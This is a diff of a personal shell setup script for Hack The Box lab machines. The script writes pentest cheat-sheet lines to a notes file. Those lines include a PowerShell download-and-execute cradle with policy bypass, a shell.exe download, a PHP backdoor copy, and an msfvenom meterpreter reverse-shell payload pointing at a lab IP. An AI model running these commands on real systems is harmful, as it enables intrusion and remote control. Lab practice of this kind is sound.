@@ -3,24 +3,24 @@
 # set box name, IP and ostype
 #for folder in $(ls /opt/); do cd /opt/$folder/; sudo git pull; done
 
-BOXNAME=Zipping
-LAST= # not needed
-OS=Lin
+BOXNAME=Analytics
+LAST=
+OS=lin
+USER=bob
 
-export IP=10.129.103.139
-export SELF=`hostname -I | awk '{print $2}'`
-export HOME=/home/travis/hackthebox/$BOXNAME          #enter box Name
-export SELF=$(hostname -I | awk '{print$3}')
+export IP=10.129.147.61
+export HOME=/home/$USER/hackthebox/$BOXNAME          #enter box Name
+export SELF=$(hostname -I | awk '{print $5}')
 
 #start obsidian in background and push errors/output to /dev/null will need to copy .config/obsidian to folder or something to make it load the working directory but will figure out later...
 #and uhh.. doesn't load the newest version.. for some reason will add to notes to get it going may be just copying the vaults to show the vaults the .config/obsidian/obsidian.json but will play with later.. 
 # the current working vault = 
 #/opt/obsidian/Obsidian-0.11.5.AppImage &>/dev/null &
 
-read "Press [Enter] key if this is first run"
-read "Are you sure this is the first run?"
+#read "Press [Enter] key if this is first run"
+#read "Are you sure this is the first run?"
 ## Bash add pause prompt for 5 seconds ##
-read -t 5 "I am going to wait for 5 seconds only ..."
+#read -t 5 "I am going to wait for 5 seconds only ..."
 
 #only run if first time or will lose all work
 mkdir $HOME
@@ -90,6 +90,23 @@ echo "powershell.exe -nop -ep bypass -c \"IEX(New-Object Net.WebClient).Download
 echo 'IWR http://10.10.10.10/shell.exe -OutFile shell.exe' >> $HOME/notes
 echo 'cp /usr/share/webshells/php/simple-backdoor.php .' >> $HOME/notes
 echo 'klist,kinit,ksu when you have a tgt or tgs and just kerberos port 88' >> $HOME/notes
+# usefull windows stuff.
+echo "" >> $HOME/notes
+echo "# usefull windows tricks" >> $HOME/notes
+echo 'msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.124 LPORT=9001 -f exe -o shell.exe' >> $HOME/notes
+echo 'Get-CimInstance -Query "select * from win32_service where Started=True"|fl Name,PathName,Started,StartName' >> $HOME/notes
+echo 'Expand-Archive xyz.zip' >> $HOME/notes
+echo 'iconv -f utf-16le -t utf-8 lin.log -o lin2.log' >> $HOME/notes
+
+# Windows privesc checklist
+echo "" >> $HOME/notes
+echo '# Windows privesc checklist' >> $HOME/notes
+echo 'https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation' >> $HOME/notes
+
+# linux prives checklist
+echo "" >> $HOME/notes
+echo '# linux privesc checklist' >> $HOME/notes
+echo 'https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist' >> $HOME/notes
 
 # CREATE A CREDENTIAL OBJECT
 echo "" >> $HOME/notes
